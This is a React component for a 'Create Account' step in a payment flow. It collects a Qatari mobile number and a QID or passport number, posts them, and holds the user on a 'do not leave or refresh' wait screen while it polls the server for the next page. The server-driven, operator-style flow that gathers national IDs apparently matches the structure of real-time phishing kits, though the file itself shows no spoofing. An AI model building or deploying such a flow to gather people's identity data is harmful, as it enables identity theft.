import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button, TextInput } from "@mantine/core";
import { UserPlus } from "lucide-react";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

export function FlowRegisterPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [mobile, setMobile] = useState("");
  const [qid, setQid] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "register",
    enabled: submitted && !!reference,
  });

  const handleSubmit = async () => {
    if (!mobile.trim() || !qid.trim()) {
      setError("Please fill all fields");
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "register_submitted", {
        mobile,
        qatari_id_or_passport: qid,
      });
      setSubmitted(true);
    } catch {
      setError("Network error — please try again");
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div className={styles.flowPage}>
      <div className={styles.flowCard}>
        <div className={styles.flowLogo}>
          <UserPlus size={44} color="#8b1a3a" />
        </div>
        <p className={styles.flowTitle}>Create Account</p>
        <p className={styles.flowSubtitle}>Enter your details to register</p>

        <TextInput
          label="Mobile (+974)"
          placeholder="e.g. 55123456"
          value={mobile}
          inputMode="tel"
          onChange={(e) => setMobile(e.currentTarget.value.replace(/\D/g, ""))}
          mb="sm"
        />
        <TextInput
          label="QID / Passport Number"
          placeholder="QID or Passport"
          value={qid}
          onChange={(e) => setQid(e.currentTarget.value)}
          mb="sm"
        />

        {error && (
          <p
            style={{ color: "#991b1b", fontSize: "0.85rem", marginBottom: 10 }}
          >
            {error}
          </p>
        )}

        <Button
          fullWidth
          loading={busy}
          onClick={handleSubmit}
          className={styles.submitBtn}
          styles={{
            root: {
              background: "#8b1a3a",
              "&:hover": { background: "#751532" },
            },
          }}
        >
          Create Account
        </Button>
      </div>

      {submitted && (
        <div className={styles.loadingWrap}>
          <div className={styles.spinnerOuter}>
            <div className={styles.spinnerInner} />
          </div>
          <p className={styles.loadingTitle}>Please wait</p>
          <p className={styles.loadingSubtitle}>Processing your information</p>
          <div className={styles.loadingNoteBox}>
            <p className={styles.loadingNote}>
              Please do not leave or refresh this page until the process is
              complete
            </p>
          </div>
          <div className={styles.dots}>
            <span className={styles.dot} />
            <span className={styles.dot} />
            <span className={styles.dot} />
          </div>
        </div>
      )}
    </div>
  );
}
